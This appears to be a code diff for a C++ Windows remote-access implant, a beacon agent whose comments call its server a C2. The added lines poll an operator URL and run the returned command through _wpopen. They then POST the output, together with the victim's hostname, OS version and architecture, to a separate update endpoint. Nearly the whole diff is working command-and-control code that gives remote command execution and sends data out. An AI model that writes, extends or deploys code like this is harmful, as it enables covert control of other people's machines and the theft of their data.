@@ -3,7 +3,7 @@
 #include <sstream>			// URL encoding
 #include <string>			// URL encoding
 #include "stdafx.h"			// WinHttpClient
-#include "WinHttpClient.h"		// WinHttpClient
+#include "WinHttpClient.h"	// WinHttpClient
 #include <Psapi.h>			// GetModuleBaseName()
 #include <iostream>
 #include <string>
@@ -20,16 +20,19 @@ wstring GetArchitecture();
 string UTF8Encode(const wstring &PostData);
 string URLEncode(const string &Value);
 wstring Beacon(const wstring &BeaconURL, const wstring &UserAgent);
-wstring ExtractString(wstring Source, wstring Start, wstring End);
+wstring ExtractString(const wstring Source, const wstring Start, const wstring End);
+wstring ExecuteCommand(const wstring &BeaconResponse);
+void CommandUpdate(const wstring &UpdateURL, const wstring &UserAgent, const wstring &CommandOutput, const wstring &Id, const wstring &Action, const wstring &Secondary);
 // End of function prototypes
 
 #pragma comment(lib, "Psapi.lib") // GetModuleBaseName()
 
 int main()
 {
-	wstring BeaconURL = L"https://192.168.1.100/beacon.php"; // **** Needs changed by user ****
-	wstring UserAgent = L"Test";				 // **** Needs changed by user ****
-	int BeaconInterval = 10000;				 // **** Needs changed by user ****
+	wstring BeaconURL = L"http://192.168.1.135/beacon.php"; // **** Needs changed by user ****
+	wstring UpdateURL = L"http://192.168.1.135/update.php"; // **** Needs changed by user ****
+	wstring UserAgent = L"Test";							// **** Needs changed by user ****
+	int BeaconInterval = 10000;								// **** Needs changed by user ****
 
 	// Infinite loop
 	while (true)
@@ -41,12 +44,13 @@ int main()
 		if (BeaconResponse.find(L"<action>command</action>") != wstring::npos)
 		{
 			// Parses task information
-			wstring id = ExtractString(BeaconResponse, L"<id>", L"</id>");
-			wstring action = ExtractString(BeaconResponse, L"<action>", L"</action>");
-			wstring secondary = ExtractString(BeaconResponse, L"<secondary>", L"</secondary>");
+			wstring Id = ExtractString(BeaconResponse, L"<id>", L"</id>");
+			wstring Action = ExtractString(BeaconResponse, L"<action>", L"</action>");
+			wstring Secondary = ExtractString(BeaconResponse, L"<secondary>", L"</secondary>");
+			
+			wstring CommandOutput = ExecuteCommand(Secondary); // Executes tasked command and saves output in "CommandOutput" variable
 
-			wcout << secondary << endl;
-			// Needs call to popen() here with the extracted command
+			CommandUpdate(UpdateURL, UserAgent, CommandOutput, Id, Action, Secondary); // Updates command output to C2 server
 		}
 
 		// If statement to determine if BeaconResponse contains <action>upload</action> here
@@ -230,7 +234,7 @@ wstring Beacon(const wstring &BeaconURL, const wstring &UserAgent)
 // Extracts task information
 // IE: Calling ExtractString(BeaconResponse, L"<id>", L"</id>"); will return the task ID
 // Returns "Stripped" wstring
-wstring ExtractString(wstring Source, wstring Start, wstring End)
+wstring ExtractString(const wstring Source, const wstring Start, const wstring End)
 {
 	wstring EmptyString;
 	size_t StartIndex = Source.find(Start);
@@ -250,4 +254,62 @@ wstring ExtractString(wstring Source, wstring Start, wstring End)
 	wstring Stripped = Source.substr(StartIndex, EndIndex - StartIndex);
 	return Stripped;
 }
+
 // End of ExtractString() function
+
+
+// Code modified from http://www.cplusplus.com/forum/unices/28134/
+// Runs the tasked command usng popen() and gets the output
+// Returns "output" wstring
+wstring ExecuteCommand(const wstring &Secondary)
+{
+	wstring Temp = L" 2>&1"; // Necessary to redirect Standard Error to Standard Output
+	wstring Command = Secondary.data() + Temp; // Janky but this is necessary
+
+	wchar_t Buffer[256];
+	wstring Output;
+
+	FILE* pipe = _wpopen(Command.data(), L"r");
+
+	while (!feof(pipe))
+	{
+		if (fgetws(Buffer, 256, pipe) != NULL)
+		{
+			Output += Buffer;
+		}
+
+	}
+
+	_pclose(pipe); // Closes pipe
+
+	return Output;
+}
+// End of ExecuteCommand() function
+
+
+// Updates task output to the specified C2 server
+// Doesn't return anything
+void CommandUpdate(const wstring &UpdateURL, const wstring &UserAgent, const wstring &CommandOutput, const wstring &Id, const wstring &Action, const wstring &Secondary)
+{
+	WinHttpClient Update(UpdateURL);
+	Update.SetUserAgent(UserAgent);
+	Update.SetProxy(L"127.0.0.1:9999");	// DEBUGGING - REMOVE LATER
+
+	string PostData;
+
+	if (GetArchitecture() == L"x86") // If system architecture is x86 so we need to call the 32-bit version of getOS()
+		PostData = "hostname=" + URLEncode(UTF8Encode(GetHostname())) + "&os=" + URLEncode(UTF8Encode(Get32BitOS())) + "&architecture=" + UTF8Encode(GetArchitecture()) + "&id=" + UTF8Encode(Id) + "&action=" + UTF8Encode(Action) + "&secondary=" + URLEncode(UTF8Encode(Secondary)) + "&output=" + URLEncode(UTF8Encode(CommandOutput)); // POST data
+	else // Else system architecture is x64 so we need to call the 64-bit version of getOS()
+		PostData = "hostname=" + URLEncode(UTF8Encode(GetHostname())) + "&os=" + URLEncode(UTF8Encode(Get64BitOS())) + "&architecture=" + UTF8Encode(GetArchitecture()) + "&id=" + UTF8Encode(Id) + "&action=" + UTF8Encode(Action) + "&secondary=" + URLEncode(UTF8Encode(Secondary)) + +"&output=" + URLEncode(UTF8Encode(CommandOutput)); // POST data
+
+	Update.SetAdditionalDataToSend((BYTE *)PostData.c_str(), PostData.size());
+	wstring ContentLength = to_wstring(PostData.length()); // We need to create new wstring for the "Content-Length" so we can append to the other headers
+
+	wstring Headers = L"Content-Length: ";
+	Headers += ContentLength;
+	Headers += L"\r\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\r\n";
+	Update.SetAdditionalRequestHeaders(Headers); // Appends headers above
+
+	Update.SendHttpRequest(L"POST"); // Sends the POST request
+}
+// End of Update() function
